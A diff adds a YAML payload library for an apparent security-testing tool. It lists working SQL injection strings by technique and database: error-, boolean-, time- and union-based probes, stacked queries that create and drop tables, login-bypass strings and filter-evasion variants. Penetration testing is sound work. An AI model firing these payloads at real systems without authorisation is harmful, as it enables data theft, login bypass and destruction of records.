@@ -1,0 +1,101 @@
+id: sqli-payloads
+category: payloads
+name: SQL Injection Payload Library
+
+description: >
+  Curated SQL injection payloads organized by technique and DBMS.
+  Use with injection_test(types='sql') or http_request for manual testing.
+
+error_based:
+  generic:
+    - "'"
+    - "'--"
+    - "' OR 1=1--"
+    - "' OR '1'='1"
+    - "\" OR 1=1--"
+    - "') OR 1=1--"
+    - "1' AND 1=CONVERT(int,(SELECT @@version))--"
+  mysql:
+    - "' AND extractvalue(1,concat(0x7e,(SELECT version())))--"
+    - "' AND updatexml(1,concat(0x7e,(SELECT user())),1)--"
+    - "' AND (SELECT 1 FROM (SELECT count(*),concat(version(),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
+  postgresql:
+    - "' AND 1=CAST((SELECT version()) AS int)--"
+    - "'::int"
+  mssql:
+    - "' AND 1=CONVERT(int,@@version)--"
+    - "'; WAITFOR DELAY '0:0:5'--"
+
+boolean_based:
+  true_conditions:
+    - "' AND 1=1--"
+    - "' AND 'a'='a'--"
+    - "1 AND 1=1"
+    - "') AND ('1'='1"
+  false_conditions:
+    - "' AND 1=2--"
+    - "' AND 'a'='b'--"
+    - "1 AND 1=2"
+    - "') AND ('1'='2"
+
+time_based:
+  mysql:
+    - "' AND SLEEP(5)--"
+    - "' AND BENCHMARK(5000000,SHA1('test'))--"
+    - "1' AND (SELECT SLEEP(5) FROM dual WHERE 1=1)--"
+  postgresql:
+    - "'; SELECT pg_sleep(5)--"
+    - "' AND (SELECT CASE WHEN 1=1 THEN pg_sleep(5) ELSE pg_sleep(0) END)--"
+  mssql:
+    - "'; WAITFOR DELAY '0:0:5'--"
+    - "' AND (SELECT CASE WHEN 1=1 THEN WAITFOR DELAY '0:0:5' END)--"
+  sqlite:
+    - "' AND 1=randomblob(500000000)--"
+  oracle:
+    - "' AND dbms_pipe.receive_message(('x'),5)=1--"
+
+union_based:
+  column_count:
+    - "' ORDER BY 1--"
+    - "' ORDER BY 5--"
+    - "' ORDER BY 10--"
+    - "' ORDER BY 20--"
+    - "' UNION SELECT NULL--"
+    - "' UNION SELECT NULL,NULL--"
+    - "' UNION SELECT NULL,NULL,NULL--"
+  string_detection:
+    - "' UNION SELECT 'secmcp_marker',NULL,NULL--"
+    - "' UNION SELECT NULL,'secmcp_marker',NULL--"
+    - "' UNION SELECT NULL,NULL,'secmcp_marker'--"
+
+stacked_queries:
+  - "'; SELECT 1--"
+  - "'; CREATE TABLE secmcp_test(x int)--"
+  - "'; DROP TABLE secmcp_test--"
+
+auth_bypass:
+  - "' OR 1=1--"
+  - "' OR 1=1#"
+  - "' OR '1'='1"
+  - "admin'--"
+  - "admin' OR 1=1--"
+  - "' OR 1=1 LIMIT 1--"
+  - "') OR ('1'='1'--"
+  - "' OR 1=1/*"
+
+waf_bypass:
+  case_alternation:
+    - "' oR 1=1--"
+    - "' Or 1=1--"
+    - "' UnIoN SeLeCt NULL--"
+  comment_injection:
+    - "' OR/**/1=1--"
+    - "' UN/**/ION SE/**/LECT NULL--"
+    - "'/*!50000OR*/1=1--"
+  encoding:
+    - "'%20OR%201=1--"
+    - "'%0aOR%0a1=1--"
+    - "' OR 1%3D1--"
+  no_spaces:
+    - "'OR(1=1)--"
+    - "'UNION(SELECT(NULL))--"
